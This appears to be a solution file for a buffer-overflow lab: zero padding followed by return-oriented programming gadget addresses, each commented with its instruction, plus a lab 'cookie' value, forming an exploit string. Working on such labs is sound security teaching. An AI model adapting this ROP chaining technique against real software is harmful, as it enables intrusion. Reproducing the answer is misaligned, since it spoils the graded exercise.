00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
d3 19 40 00 00 00 00 00     /* popq %rax */ 
c5 4b 50 7e 00 00 00 00     /* cookie */
30 19 40 00 00 00 00 00     /* movq %rax, %rbp */
46 19 40 00 00 00 00 00     /* movq %rbx, %rdi */
91 19 40 00 00 00 00 00      /* popq %rdx  */
c5 4b 50 7e 00 00 00 00      /* cookie */
66 19 40 00 00 00 00 00      /* movq %rdx %rcx */
fc 18 40 00 00 00 00 00      /* movq %rcx %rbp */
7c 19 40 00 00 00 00 00      /* movq %rbp %rsi */
97 19 40 00 00 00 00 00      /* sarq %rsi */
97 19 40 00 00 00 00 00      /* sarq %rsi */
ce 15 40 00 00 00 00 00     
